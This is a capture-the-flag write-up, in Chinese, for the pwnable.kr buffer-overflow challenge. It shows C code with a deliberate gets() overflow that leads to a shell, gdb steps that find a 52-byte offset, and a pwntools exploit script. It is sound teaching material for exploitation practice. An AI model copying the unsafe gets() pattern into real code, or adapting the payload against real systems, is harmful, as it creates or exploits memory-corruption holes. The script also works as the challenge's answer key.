```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);   // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

code看一下就知道要想辦法利用overflowme去蓋key，蓋成0xcafebabe

用gdb先看一下

![](https://i.imgur.com/miN6uoJ.png)

很清楚看到

```
0x56555654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

這行就是c code裡面 if(key == 0xcafebabe)

我們可以印出`ebp+0x8`得知key的記憶體位置

```
gdb-peda$ p $ebp+0x8
$1 = (void *) 0xffffd5e0
```
繼續執行會執行 

```
0x5655564f <func+35>:        call   0xf7e6f890 <gets>
```

這時候隨便輸入數字 我輸入1來舉例

![](https://i.imgur.com/t7i4OXa.png)

此時會發現1存入EAX 而且位置是`0xffffd5ac`

0xffffd5ac - 0xffffd5e0 = -52

offset = 52

exploit : 

```python
from pwn import *

r = remote('pwnable.kr', 9000)

payload = 'a'*52 + p32(0xCAFEBABE)

print r.sendline(payload)

r.interactive()
```
